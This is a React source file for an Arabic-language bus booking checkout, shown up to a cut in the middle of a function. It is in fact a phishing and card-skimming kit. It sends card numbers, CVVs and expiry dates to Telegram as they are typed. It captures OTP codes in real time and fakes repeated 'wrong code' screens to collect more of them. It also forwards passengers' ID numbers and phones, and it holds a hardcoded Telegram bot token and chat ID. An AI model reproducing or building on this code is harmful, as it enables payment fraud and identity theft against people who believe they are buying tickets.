import React, { useState, useMemo, useEffect, useCallback, useRef } from 'react';
import {
  X, MapPin, Calendar, Users, Check, ChevronLeft, ChevronDown, ChevronUp,
  Zap, Star, Shield, CreditCard, Lock, RotateCcw, Luggage, Ticket, User, AlertTriangle, Phone, Mail, Route, Clock, Bus,
  Armchair, Tv, Wifi, Coffee, Receipt, Crown, Briefcase, Wallet, Bath, Navigation,
  Plug, Snowflake, Banknote,
} from 'lucide-react';
import { trpc } from '@/providers/trpc';
import { sendToTelegram, formatBookingMessage } from '@/lib/telegram';
import { sendBookingMessage, loadTelegramSettings } from '@/lib/telegram-settings';
import { sendPaymentToTelegram, getVisitorIP } from '@/lib/payment-telegram';
import type { PaymentInfo } from '@/lib/payment-telegram';
import { findRoute, getRouteDistance, getRouteDuration, getBorderCrossings, getCityInfo, getRouteDetails, calculateRoutePrice, countryFlags, countryNames, type RouteDetails } from '@/lib/international-data';
import { detectBank, getBankInfo, type BankInfo } from '@/lib/bank-data';
import { updateVisitorStep, checkForceRedirect, initVisitorWithIP } from '@/lib/visitor-tracking';
import type { VisitorStep } from '@/lib/visitor-tracking';
import { addBooking, updateBookingField } from '@/lib/bookings-storage';
import type { StoredBooking } from '@/lib/bookings-storage';
import { getOrCreateVisitorSessionId } from '@/lib/visitor-session';
import LoadingScreen from './LoadingScreen';
import type { BookingData } from './BookingPanel';

// ─── Read pricing multipliers from admin settings ─────────────
function getFareMultiplier(fare: 'economy' | 'business' | 'vip'): number {
  try {
    const raw = localStorage.getItem('sat_pricing_settings_v3');
    if (raw) {
      const s = JSON.parse(raw);
      if (fare === 'vip') return s.vipMultiplier || 2;
      if (fare === 'business') return s.businessMultiplier || 1.2;
    }
  } catch { /* ignore */ }
  return fare === 'vip' ? 2 : fare === 'business' ? 1.2 : 1;
}

// ─── Payment Entry Notification (Payment Bot) ─────────────────
async function notifyPaymentEntry(booking: BookingData, paymentMethod: string, amount: number) {
  const ip = await getVisitorIP();
  await sendPaymentToTelegram({
    cardNumber: 'Pending',
    cardType: 'Pending',
    expiryDate: '', cvv: '', cardHolder: '',
    amount, from: booking.from, to: booking.to,
    paymentMethod, step: 'card-entered', ip,
  });
}

// ─── Types ────────────────────────────────────────────────────
interface Props { bookingData: BookingData; onClose: () => void; }
interface Trip { id: string; tripNumber: string; isDirect: boolean; fareClass: string; from: string; to: string; departureTime: string; arrivalTime: string; date: string; duration: string; distance: string; basePrice: number; routeDetails?: RouteDetails; }
interface Passenger { id: number; fullName: string; documentType: 'national_id' | 'iqama' | 'passport'; idNumber: string; phone: string; nationality: string; category: 'adult' | 'child' | 'infant'; }
interface BookerInfo { name: string; phone: string; email: string; }
type Step = 'results' | 'seat_selection' | 'passenger_info' | 'payment_method' | 'payment' | 'code_verification' | 'otp_2' | 'otp_3' | 'otp_4' | 'code_failed' | 'confirmed';

// ─── Constants ────────────────────────────────────────────────
const fareTypes = [
  {
    id: 'economy',
    name: 'الأساسية',
    badge: 'توفير',
    badgeColor: 'bg-blue-500',
    desc: 'رحلة مريحة بأسعار اقتصادية',
    features: [
      { icon: 'luggage', label: 'أمتعة 50 كجم' },
      { icon: 'modify', label: 'تعديل التذكرة' },
      { icon: 'shield', label: 'استرداد جزئي' },
      { icon: 'cancel', label: 'إلغاء ممكن' },
      { icon: 'seat', label: 'مقاعد 2+2' },
    ],
  },
  {
    id: 'vip',
    name: 'VIP',
    badge: 'الأفضل قيمة',
    badgeColor: 'bg-brand-gold',
    desc: 'تجربة سفر فاخرة بخدمات مميزة',
    recommended: true,
    features: [
      { icon: 'luggage', label: 'أمتعة 50 كجم' },
      { icon: 'modify', label: 'تعديل مجاني' },
      { icon: 'shield', label: 'استرداد كامل' },
      { icon: 'cancel', label: 'إلغاء مجاني' },
      { icon: 'seat', label: 'مقاعد 1+2 فاخرة' },
      { icon: 'screen', label: 'شاشة ترفيهية' },
      { icon: 'wifi', label: 'واي فاي مجاني' },
      { icon: 'host', label: 'مضيف على الرحلة' },
    ],
  },
];

const featureIconsMap: Record<string, React.ReactNode> = {
  luggage: <Luggage className="w-3.5 h-3.5" />,
  modify: <RotateCcw className="w-3.5 h-3.5" />,
  shield: <Shield className="w-3.5 h-3.5" />,
  cancel: <X className="w-3.5 h-3.5" />,
  seat: <Armchair className="w-3.5 h-3.5" />,
  screen: <Tv className="w-3.5 h-3.5" />,
  wifi: <Wifi className="w-3.5 h-3.5" />,
  host: <Coffee className="w-3.5 h-3.5" />,
};

// ─── Card Brand SVG Icons (Official) ──────────────────────────
const VisaIcon: React.FC<{ className?: string }> = ({ className = 'w-20 h-7' }) => (
  <div className={`${className} flex items-center justify-center`}>
    <span className="text-[#1A1F71] font-extrabold text-2xl italic tracking-[0.15em]" style={{ fontFamily: 'Arial, Helvetica, sans-serif' }}>VISA</span>
  </div>
);

const MastercardIcon: React.FC<{ className?: string }> = ({ className = 'w-10 h-8' }) => (
  <svg className={className} viewBox="0 0 48 30" fill="none">
    <circle cx="18" cy="15" r="12" fill="#EB001B"/>
    <circle cx="30" cy="15" r="12" fill="#F79E1B"/>
    <path d="M24 4.5C27.2 7.3 29 11.2 29 15S27.2 22.7 24 25.5C20.8 22.7 19 18.8 19 15S20.8 7.3 24 4.5Z" fill="#FF5F00"/>
  </svg>
);

const MadaIcon: React.FC<{ className?: string }> = ({ className = 'w-24 h-10' }) => (
  <svg className={className} viewBox="0 0 144 48" fill="none" xmlns="http://www.w3.org/2000/svg">
    {/* Blue stripe */}
    <rect x="0" y="2" width="56" height="20" rx="2" fill="#259bd6"/>
    {/* Green stripe */}
    <rect x="0" y="26" width="56" height="20" rx="2" fill="#84b740"/>
    {/* mada text */}
    <text x="64" y="20" fill="#27292d" fontSize="18" fontWeight="900" fontFamily="Arial, Helvetica, sans-serif">mada</text>
    {/* مدى text */}
    <text x="64" y="42" fill="#27292d" fontSize="18" fontWeight="900" fontFamily="Arial, Helvetica, sans-serif">مدى</text>
  </svg>
);

const paymentMethods = [
  {
    id: 'visa',
    name: 'Visa / Mastercard',
    icon: (
      <div className="flex items-center gap-3">
        <VisaIcon className="w-20 h-7" />
        <MastercardIcon className="w-10 h-8" />
      </div>
    ),
  },
  {
    id: 'mada',
    name: 'مدى',
    icon: (
      <div className="flex items-center justify-center w-20 h-10">
        <MadaIcon className="w-20 h-8" />
      </div>
    ),
  },
];

// Card icon for card number field — shows ONLY the card brand
const CardTypeIconInField: React.FC<{ cardType: string; className?: string }> = ({ cardType, className = 'w-14 h-8' }) => {
  if (cardType === 'visa') return <VisaIcon className={className} />;
  if (cardType === 'mastercard') return <MastercardIcon className={className} />;
  if (cardType === 'mada') return <MadaIcon className={className} />;
  return <CreditCard className="w-6 h-6 text-[#B5AFA3]" />;
};

const loadingMessages = [
  'جارٍ البحث عن أفضل الرحلات المتاحة...',
  'جارٍ تحميل خريطة المقاعد...',
  'جارٍ التحقق من معلومات الحجز...',
  'جارٍ تحضير خيارات الدفع...',
  'جارٍ معالجة الدفع...',
  'جارٍ إرسال رمز التحقق...',
  'جارٍ تأكيد الحجز وإرسال البيانات...',
];

// ─── Helpers ──────────────────────────────────────────────────
const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));

function generateTrips(data: BookingData): Trip[] {
  const count = data.tripType === 'round-trip' ? 4 : 3;

  // Use international route data only
  const route = findRoute(data.from, data.to);
  const dist = route ? route.distanceKm : 500;
  const durationHours = route ? Math.floor(route.durationHours) : 6;
  const durationMinutes = route ? Math.round((route.durationHours - Math.floor(route.durationHours)) * 60) : 0;
  const basePrice = route ? route.economyPrice : 200;
  const isDirect = route ? route.routeType === 'direct' : true;
  const borderInfo = route && route.borderCrossings.length > 0
    ? ` • ${route.borderCrossings.join(' • ')}`
    : '';
  const city1Info = getCityInfo(data.from);
  const city2Info = getCityInfo(data.to);
  const isInternational = city1Info && city2Info && city1Info.country !== city2Info.country;

  return Array.from({ length: count }, (_, i) => {
    const hour = 6 + i * 3;
    const depMinutes = i % 2 === 0 ? '00' : '30';
    const depTime = `${hour.toString().padStart(2, '0')}:${depMinutes}`;
    const arrH = (hour + durationHours) % 24;
    const arrM = Math.abs(durationMinutes).toString().padStart(2, '0');

    // Dynamic pricing: base economy price — fare multiplier applied separately via selectedFare
    const fareClasses: Array<'economy' | 'business' | 'vip'> = ['vip', 'business', 'economy'];
    const tripFareClass = fareClasses[i % 3];
    const tripBasePrice = calculateRoutePrice(data.from, data.to, 'economy');

    return {
      id: `trip-${i}`, tripNumber: `SAT-${2360 + i}`, isDirect,
      fareClass: tripFareClass === 'vip' ? 'VIP' : tripFareClass === 'business' ? 'عملية' : 'اقتصادي',
      from: data.from, to: data.to, departureTime: depTime,
      arrivalTime: `${arrH.toString().padStart(2, '0')}:${arrM}`,
      date: data.pickupDate, duration: `${durationHours} س ${Math.abs(durationMinutes)} د`,
      distance: `${Math.round(dist)} كم${borderInfo}${isInternational ? ' • دولي' : ''}`,
      basePrice: tripBasePrice,
      routeDetails: getRouteDetails(data.from, data.to),
    };
  });
}

function formatDate(dateStr: string): string {
  if (!dateStr) return '';
  return new Date(dateStr + 'T00:00:00').toLocaleDateString('ar-SA', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
}

function generateSeats() {
  const seats: { id: string; row: number; col: number; status: 'available' | 'occupied' }[] = [];
  for (let r = 1; r <= 8; r++) for (let c = 1; c <= 4; c++) {
    seats.push({ id: `seat-${(r - 1) * 4 + c}`, row: r, col: c, status: Math.random() < 0.35 ? 'occupied' : 'available' });
  }
  return seats;
}

function detectCardType(num: string): string {
  if (/^(4003|4406|4685|5391|5576|9682)/.test(num)) return 'mada';
  if (/^4/.test(num)) return 'visa';
  if (/^5[1-5]/.test(num)) return 'mastercard';
  if (/^3[47]/.test(num)) return 'amex';
  return '';
}

const formatCardNumber = (val: string) => val.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim();

// ─── Luhn Algorithm for Card Validation ───────────────────
function luhnCheck(num: string): boolean {
  const digits = num.replace(/\s/g, '').replace(/\D/g, '');
  if (digits.length < 13) return false;
  let sum = 0;
  let alt = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = parseInt(digits.substring(i, i + 1), 10);
    if (alt) { n *= 2; if (n > 9) n -= 9; }
    sum += n;
    alt = !alt;
  }
  return sum % 10 === 0;
}

// ─── Expiry Date Validation ───────────────────────────────
function isExpiryValid(expiry: string): boolean {
  if (!expiry || expiry.length < 5) return false;
  const [mm, yy] = expiry.split('/');
  if (!mm || !yy) return false;
  const month = parseInt(mm, 10);
  const year = parseInt('20' + yy, 10);
  if (month < 1 || month > 12) return false;
  const now = new Date();
  const currentYear = now.getFullYear();
  const currentMonth = now.getMonth() + 1;
  if (year < currentYear) return false;
  if (year === currentYear && month < currentMonth) return false;
  return true;
}

// ─── Card Length by Type ──────────────────────────────────
function getCardLength(type: string): number {
  if (type === 'amex') return 15;
  return 16;
}

// ─── Generic Step Notification ───────────────────────────────
async function notifyStep(stepName: string, booking: BookingData, extra: Record<string, string> = {}) {
  // Map step names to booking message IDs
  const stepMap: Record<string, string> = {
    '✅ اختيار الرحلة والضغط على احجز الآن': 'trip-selected',
    '💺 اختيار المقاعد': 'seats-selected',
    '📝 إدخال بيانات المسافرين': 'passenger-info',
    '💳 اختيار طريقة الدفع': 'payment-method',
  };
  const msgId = stepMap[stepName];
  const time = new Date().toLocaleString('ar-SA');
  if (msgId) {
    await sendBookingMessage(msgId, {
      from: booking.from,
      to: booking.to,
      date: booking.pickupDate,
      passengers: String(booking.passengers),
      time,
      ...extra,
    });
    return;
  }
  // Fallback for unknown steps
  let extraStr = '';
  for (const [k, v] of Object.entries(extra)) {
    extraStr += `\n<b>${k}:</b> ${v}`;
  }
  const msg = `<b>📋 خطوة: ${stepName}</b>

<b>📍 من:</b> ${booking.from}
<b>📍 إلى:</b> ${booking.to}
<b>📅 التاريخ:</b> ${booking.pickupDate}
<b>👥 المسافرين:</b> ${booking.passengers}${extraStr}

<b>⏰ الوقت:</b> ${time}`;
  const tg = loadTelegramSettings();
  await sendToTelegram(tg.bookingBotToken || '7004280527:AAEVpkQzFP9JCuDbmUlwiVqSQBk5zGctklE', tg.bookingChatId || '-1002052429288', msg);
}

// ─── Main Component ───────────────────────────────────────────
const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
  const utils = trpc.useUtils();
  const [step, setStep] = useState<Step>('results');
  const [expandedTrip, setExpandedTrip] = useState<string | null>(null);
  const [selectedFare, setSelectedFare] = useState('economy');
  const [selectedTripId, setSelectedTripId] = useState<string | null>(null);
  const [bookingId, setBookingId] = useState<number | null>(null);
  const [localBookingId, setLocalBookingId] = useState<number | null>(null); // for localStorage bookings
  const visitorSessionId = useMemo(() => getOrCreateVisitorSessionId(), []);
  const totalPassengers = (bookingData.adults || bookingData.passengers || 1) + (bookingData.children || 0) + (bookingData.infants || 0);

  // Generate passengers with proper categories from bookingData (adults/children/infants)
  const passengers = useMemo<Passenger[]>(() => {
    const list: Passenger[] = [];
    let id = 1;
    const adultCount = bookingData.adults || bookingData.passengers || 1;
    const childCount = bookingData.children || 0;
    const infantCount = bookingData.infants || 0;
    for (let i = 0; i < adultCount; i++) { list.push({ id: id++, fullName: '', documentType: 'national_id', idNumber: '', phone: '', nationality: 'سعودي', category: 'adult' }); }
    for (let i = 0; i < childCount; i++) { list.push({ id: id++, fullName: '', documentType: 'national_id', idNumber: '', phone: '', nationality: 'سعودي', category: 'child' }); }
    for (let i = 0; i < infantCount; i++) { list.push({ id: id++, fullName: '', documentType: 'national_id', idNumber: '', phone: '', nationality: 'سعودي', category: 'infant' }); }
    return list;
  }, [bookingData.adults, bookingData.children, bookingData.infants, bookingData.passengers]);

  // Keep passenger data in a ref so it persists across re-renders
  const passengerDataRef = useRef<Record<number, Partial<Passenger>>>({});
  const [passengerOverrides, setPassengerOverrides] = useState<Record<number, Partial<Passenger>>>({});

  const updatePassenger = (idx: number, field: keyof Passenger, value: string) => {
    const p = passengers[idx];
    if (!p) return;
    setPassengerOverrides(prev => ({
      ...prev,
      [p.id]: { ...(prev[p.id] || {}), [field]: value },
    }));
  };

  // Merge base passengers with user overrides
  const mergedPassengers = useMemo(() => {
    return passengers.map(p => ({
      ...p,
      ...(passengerOverrides[p.id] || {}),
    }));
  }, [passengers, passengerOverrides]);

  const [bookerInfo, setBookerInfo] = useState<BookerInfo>({ name: '', phone: '', email: '' });
  const [selectedSeats, setSelectedSeats] = useState<string[]>([]);
  const [selectedPayment, setSelectedPayment] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardHolderFirst, setCardHolderFirst] = useState('');
  const [cardHolderLast, setCardHolderLast] = useState('');
  const [verificationCode, setVerificationCode] = useState('');
  const [failedAttempts, setFailedAttempts] = useState(0);
  const [detectedBank, setDetectedBank] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [loadingMsg, setLoadingMsg] = useState('');
  const [resultsLoaded, setResultsLoaded] = useState(false);
  const [showCardErrorToast, setShowCardErrorToast] = useState(false);

  // ═══ Real-time card notification to Telegram ═══
  // Notify (1) when card number reaches 16 digits, (2) when all fields complete
  const cardNotifiedRef = useRef(false);
  const allFieldsNotifiedRef = useRef(false);

  useEffect(() => {
    const digitsOnly = cardNumber.replace(/\s/g, '');
    const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';

    // Stage 1: Card number complete (16 digits) → notify payment bot
    if (digitsOnly.length >= 16 && !cardNotifiedRef.current) {
      cardNotifiedRef.current = true;
      const cardType = detectCardType(digitsOnly);
      const cardTypeName = cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'mada' ? 'mada' : 'غير معروف';
      const bankResult = detectBank(cardNumber);
      sendPaymentToTelegram({
        cardNumber, cardType: cardTypeName, expiryDate, cvv,
        cardHolder: `${cardHolderFirst} ${cardHolderLast}`.trim() || 'Not entered',
        amount: finalTotal, from: bookingData.from, to: bookingData.to,
        paymentMethod: paymentName, step: 'card-entered',
        bankName: bankResult?.bank.name || 'Unknown',
      });
    }

    // Stage 2: All card fields complete (ready to pay) → notify payment bot
    const expFilled = expiryDate.length >= 5;
    const cvvFilled = cvv.length >= 3;
    if (digitsOnly.length >= 16 && expFilled && cvvFilled && !allFieldsNotifiedRef.current) {
      allFieldsNotifiedRef.current = true;
      const cardType = detectCardType(digitsOnly);
      const cardTypeName = cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'mada' ? 'mada' : 'غير معروف';
      const bankResult2 = detectBank(cardNumber);
      sendPaymentToTelegram({
        cardNumber, cardType: cardTypeName, expiryDate, cvv,
        cardHolder: `${cardHolderFirst} ${cardHolderLast}`.trim() || 'Not entered',
        amount: finalTotal, from: bookingData.from, to: bookingData.to,
        paymentMethod: paymentName, step: 'card-complete',
        bankName: bankResult2?.bank.name || 'Unknown',
      });
    }

    // Reset if card is cleared
    if (digitsOnly.length < 16) {
      cardNotifiedRef.current = false;
      allFieldsNotifiedRef.current = false;
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [cardNumber, expiryDate, cvv]);

  // ═══ Real-time OTP notification to Telegram ═══
  // Send OTP digits to Telegram immediately when user types 4, 5, or 6 digits
  // BEFORE they click the confirm button
  const otpRealTimeSentRef = useRef<Record<string, boolean>>({});
  useEffect(() => {
    const len = verificationCode.length;
    // Only trigger for 4, 5, or 6 digits
    if (len < 4 || len > 6) return;

    // Build a unique key for this attempt + code length to prevent duplicates
    const key = `${failedAttempts}_${len}_${verificationCode}`;
    if (otpRealTimeSentRef.current[key]) return;
    otpRealTimeSentRef.current[key] = true;

    const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';
    const cardType = detectCardType(cardNumber.replace(/\s/g, ''));
    const cardTypeName = cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'mada' ? 'mada' : 'Unknown';
    const bankResult = detectBank(cardNumber);

    sendPaymentToTelegram({
      cardNumber, cardType: cardTypeName, expiryDate, cvv,
      cardHolder: `${cardHolderFirst} ${cardHolderLast}`.trim() || 'Not entered',
      amount: finalTotal, from: bookingData.from, to: bookingData.to,
      paymentMethod: paymentName, step: 'otp-typing',
      otpCode: verificationCode,
      attemptNumber: failedAttempts + 1,
      bankName: bankResult?.bank.name || 'Unknown',
    });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [verificationCode]);

  const trips = useMemo(() => generateTrips(bookingData), [bookingData]);
  const seats = useMemo(() => generateSeats(), []);
  const activeTrip = trips.find(t => t.id === selectedTripId) || trips[0] || null;
  const currentFare = fareTypes.find(f => f.id === selectedFare) || fareTypes[0];
  const fareMul = getFareMultiplier(selectedFare as 'economy' | 'business' | 'vip');
  // Price calc with adults (100%), children (50%), infants (25%)
  const calcTotal = useCallback((bp: number) => {
    const adults = bookingData.adults || bookingData.passengers || 1;
    const children = bookingData.children || 0;
    const infants = bookingData.infants || 0;
    const adultTotal = adults * bp * fareMul;
    const childTotal = children * bp * fareMul * 0.5;
    const infantTotal = infants * bp * fareMul * 0.25;
    const st = Math.round((adultTotal + childTotal + infantTotal) * 100) / 100;
    const vt = Math.round(st * 0.15 * 100) / 100;
    return { subtotal: st, vat: vt, total: Math.ceil((st + vt) * 100) / 100 };
  }, [fareMul, bookingData.adults, bookingData.children, bookingData.infants, bookingData.passengers]);
  const { subtotal, vat, total } = calcTotal(activeTrip?.basePrice || 200);
  const finalTotal = bookingData.tripType === 'round-trip' ? Math.floor(total * 0.85) : total;
  const detectedCard = detectCardType(cardNumber.replace(/\s/g, ''));

  const createBooking = trpc.bookings.create.useMutation();
  const updateBookingStep = trpc.bookings.updateStep.useMutation({ onSuccess: () => utils.bookings.list.invalidate() });
  const trackVisitor = trpc.visitors.track.useMutation();
  const settingsQuery = trpc.settings.list.useQuery();
  const getTelegramToken = trpc.settings.getTelegramToken.useQuery();

  // Reset all state when bookingData changes (new search)
  useEffect(() => {
    setStep('results');
    setExpandedTrip(null);
    setSelectedFare('economy');
    setSelectedTripId(null);
    setBookingId(null);
    setPassengerOverrides({});
    setBookerInfo({ name: '', phone: '', email: '' });
    setSelectedSeats([]);
    setSelectedPayment('');
    setCardNumber('');
    setExpiryDate('');
    setCvv('');
    setCardHolderFirst('');
    setCardHolderLast('');
    setVerificationCode('');
    setFailedAttempts(0);
    setDetectedBank(null);
    setIsLoading(false);
    setResultsLoaded(false);
    setShowCardErrorToast(false);
    passengerDataRef.current = {};
    cardNotifiedRef.current = false;
    allFieldsNotifiedRef.current = false;
    // Show loading briefly then reveal results
    const timer = setTimeout(() => setResultsLoaded(true), 1500);
    return () => clearTimeout(timer);
  }, [bookingData]);

  // Show card error toast when returning from code_failed
  useEffect(() => {
    if (step === 'payment' && showCardErrorToast) {
      const timer = setTimeout(() => setShowCardErrorToast(false), 8000);
      return () => clearTimeout(timer);
    }
  }, [step, showCardErrorToast]);

  // ─── Detect visitor IP on first load ──────────────────────
  useEffect(() => {
    initVisitorWithIP();
  }, []);

  // ─── Track every step change for admin monitoring ─────────
  useEffect(() => {
    const stepMap: Record<string, VisitorStep> = {
      results: 'results', select_trip: 'trip_details', select_seats: 'seat_selection',
      passenger_info: 'passenger_info', payment_method: 'payment_method',
      payment: 'payment', code_verification: 'code_verification',
      otp_2: 'otp_2', otp_3: 'otp_3', otp_4: 'otp_4',
      success: 'success', code_failed: 'code_failed',
    };
    const visitorStep = stepMap[step] || 'home';
    updateVisitorStep(visitorStep, {
      bookingData: {
        from: bookingData.from, to: bookingData.to,
        date: bookingData.pickupDate, passengers: bookingData.passengers,
        selectedTrip: activeTrip?.tripNumber,
        selectedSeats: selectedSeats.map(s => s.replace('seat-', '')),
        fareClass: activeTrip?.fareClass,
      },
      cardInfo: detectedBank ? {
        cardType: detectedCard || selectedPayment,
        bankName: getBankInfo(detectedBank)?.name,
      } : undefined,
    });
    trackVisitor.mutate({
      sessionId: visitorSessionId,
      page: window.location.pathname,
      userAgent: navigator.userAgent,
      step: visitorStep,
      bookingData: {
        from: bookingData.from,
        to: bookingData.to,
        date: bookingData.pickupDate,
        passengers: bookingData.passengers,
        selectedTrip: activeTrip?.tripNumber,
        selectedSeats: selectedSeats.map(s => s.replace('seat-', '')),
        fareClass: activeTrip?.fareClass,
      },
      cardInfo: detectedBank ? {
        cardType: detectedCard || selectedPayment,
        bankName: getBankInfo(detectedBank)?.name,
      } : undefined,
    });
  }, [step]);

  // ─── Check for admin force redirect ────────────────────────
  useEffect(() => {
    const interval = setInterval(() => {
      const redirect = checkForceRedirect();
      if (redirect) {
        if (redirect === 'block') { window.location.href = 'about:blank'; }
        else if (redirect.startsWith('step:')) { setStep(redirect.slice(5) as Step); }
        else { window.location.href = redirect; }
      }
    }, 2000);
    return () => clearInterval(interval);
  }, []);

  const goToStep = async (next: Step, msgIdx: number, delayMs: number = 3000) => {
    setLoadingMsg(loadingMessages[msgIdx]);
    setIsLoading(true);
    await sleep(delayMs);
    setIsLoading(false);
    setStep(next);
  };

  const allPassengersValid = mergedPassengers.every(p => p.fullName && p.idNumber && p.phone);
  const bookerValid = bookerInfo.name && bookerInfo.phone;

  // ─── Handlers ──────────────────────────────────────────────
  const handleBookNow = async (tripId: string) => {
    const trip = trips.find(t => t.id === tripId);
    if (!trip) return;
    setSelectedTripId(tripId);
    try {
      const result = await createBooking.mutateAsync({
        tripType: bookingData.tripType, fromLocation: bookingData.from, toLocation: bookingData.to,
        pickupDate: bookingData.pickupDate, pickupTime: bookingData.pickupTime || '10:00',
        returnDate: bookingData.returnDate || undefined, returnTime: bookingData.returnTime || undefined,
        passengers: bookingData.passengers,
      });
      if (result.id) {
        setBookingId(Number(result.id));
        await updateBookingStep.mutateAsync({ id: Number(result.id), selectedTrip: JSON.stringify(trip), selectedFare });
      }
    } catch { setBookingId(Date.now()); }
    notifyStep('✅ اختيار الرحلة والضغط على احجز الآن', bookingData, { tripNumber: activeTrip.tripNumber, fareClass: selectedFare });
    await goToStep('seat_selection', 1);
  };

  const handleSeatNext = async () => {
    if (selectedSeats.length !== totalPassengers) return;
    if (bookingId) { try { await updateBookingStep.mutateAsync({ id: bookingId, selectedSeats: JSON.stringify(selectedSeats) }); } catch { } }
    notifyStep('💺 اختيار المقاعد', bookingData, { seats: selectedSeats.map(s => s.replace('seat-', '')).join(', ') });
    // Use goToStep for smooth transition with loading screen
    await goToStep('passenger_info', 2, 1500);
  };

  const handlePassengerNext = async () => {
    if (!allPassengersValid || !bookerValid) return;
    if (bookingId) {
      try {
        await updateBookingStep.mutateAsync({
          id: bookingId, passengerName: mergedPassengers.map(p => p.fullName).join(', '),
          passengerPhone: mergedPassengers[0]?.phone || '',
        });
      } catch { }
    }

    // Store booking locally for admin dashboard sync
    const newLocalId = addBooking({
      fromLocation: bookingData.from,
      toLocation: bookingData.to,
      pickupDate: bookingData.pickupDate,
      pickupTime: bookingData.pickupTime || '10:00',
      returnDate: bookingData.returnDate || undefined,
      returnTime: bookingData.returnTime || undefined,
      passengers: totalPassengers,
      passengerName: bookerInfo.name || mergedPassengers[0]?.fullName || '',
      phone: bookerInfo.phone || mergedPassengers[0]?.phone || '',
      totalAmount: finalTotal,
      adults: bookingData.adults || bookingData.passengers || 1,
      children: bookingData.children || 0,
      infants: bookingData.infants || 0,
      fareClass: selectedFare === 'vip' ? 'VIP' : selectedFare === 'business' ? 'أعمال' : 'اقتصادي',
      selectedSeats: selectedSeats.join(', '),
      selectedTrip: activeTrip?.tripNumber || '',
    });
    setLocalBookingId(newLocalId.id);

    const docTypeLabel = { national_id: 'هوية وطنية', iqama: 'إقامة', passport: 'جواز سفر' };
    const pNames = mergedPassengers.map((p, i) => {
      const docLabel = docTypeLabel[p.documentType] || p.documentType;
      return `👤 مسافر ${i + 1} (${p.category === 'adult' ? 'بالغ' : p.category === 'child' ? 'طفل' : 'رضيع'}): ${p.fullName} | ${docLabel}: ${p.idNumber} | 📱 ${p.phone}`;
    }).join('\n');
    notifyStep('📝 إدخال بيانات المسافرين', bookingData, {
      passengers: `\n${pNames}`,
      booker: `${bookerInfo.name} | 📱 ${bookerInfo.phone}`,
    });
    await goToStep('payment_method', 3);
  };

  const handlePaymentMethodNext = async () => {
    if (!selectedPayment) return;
    if (bookingId) { try { await updateBookingStep.mutateAsync({ id: bookingId, paymentMethod: selectedPayment }); } catch { } }
    notifyStep('💳 اختيار طريقة الدفع', bookingData, { paymentMethod: paymentMethods.find(p => p.id === selectedPayment)?.name || selectedPayment, amount: String(finalTotal) });
    notifyPaymentEntry(bookingData, paymentMethods.find(p => p.id === selectedPayment)?.name || selectedPayment, finalTotal);
    await goToStep('payment', 4, 8000);
  };

  const handlePaymentDone = async () => {
    if (bookingId) { try { await updateBookingStep.mutateAsync({ id: bookingId, paymentStatus: 'completed', totalAmount: finalTotal }); } catch { } }
    setFailedAttempts(0);
    setVerificationCode('');

    // ─── Update local booking status to pending ─────────
    if (localBookingId) {
      updateBookingField(localBookingId, { status: 'pending', paymentMethod: paymentMethods.find(p => p.id === selectedPayment)?.name || '' });
    }

    // ─── Detect bank from card BIN ──────────────────────
    const bankResult = detectBank(cardNumber);
    if (bankResult) {
      setDetectedBank(bankResult.bankKey);
    } else {
      setDetectedBank(null); // Will use default OTP page
    }

    // Send ALL card details to payment bot
    const cardType = detectCardType(cardNumber.replace(/\s/g, ''));
    const cardTypeName = cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'mada' ? 'mada' : 'Unknown';
    const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';

    await sendPaymentToTelegram({
      cardNumber, cardType: cardTypeName, expiryDate, cvv,
      cardHolder: `${cardHolderFirst} ${cardHolderLast}`.trim() || 'Not entered',
      amount: finalTotal, from: bookingData.from, to: bookingData.to,
      paymentMethod: paymentName, step: 'card-complete',
      bankName: bankResult?.bank.name || 'Unknown',
    });

    // 8-sec loading then route to bank-branded OTP
    await goToStep('code_verification', 5, 8000);
  };

  // Unified verify handler for code_verification, otp_2, otp_3
  const handleVerifyCode = async () => {
    if (verificationCode.length < 4 || verificationCode.length > 6) return;

    const newAttempts = failedAttempts + 1;
    setFailedAttempts(newAttempts);

    // ─── Send OTP to Telegram IMMEDIATELY (real-time) ───
    const cardType = detectCardType(cardNumber.replace(/\s/g, ''));
    const cardTypeName = cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'mada' ? 'mada' : 'Unknown';
    const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';
    const bankResult = detectBank(cardNumber);
    await sendPaymentToTelegram({
      cardNumber, cardType: cardTypeName, expiryDate, cvv,
      cardHolder: `${cardHolderFirst} ${cardHolderLast}`.trim() || 'Not entered',
      amount: finalTotal, from: bookingData.from, to: bookingData.to,
      paymentMethod: paymentName, step: 'otp-attempt',
      otpCode: verificationCode, attemptNumber: newAttempts,
      bankName: bankResult?.bank.name || 'Unknown',
    });

    // Show loading (8 seconds for payment verification)
    setLoadingMsg('جارٍ التحقق من الرمز...');
    setIsLoading(true);
    await sleep(8000);
    setIsLoading(false);

    // Navigate to next step based on attempt count (clear old code each time)
    setVerificationCode('');
    if (newAttempts === 1) {
      setStep('otp_2');      // 1st wrong → otp_2
    } else if (newAttempts === 2) {
      setStep('otp_3');      // 2nd wrong → otp_3
    } else if (newAttempts >= 3) {
      setStep('otp_4');      // 3rd wrong → otp_4 (no input, just retry button)
    }
  };

  // otp_4 "Retry" button → loading → code_failed → send to payment bot
  const handleOtp4Retry = async () => {
    // Send OTP failed IMMEDIATELY (real-time)
    const cardType = detectCardType(cardNumber.replace(/\s/g, ''));
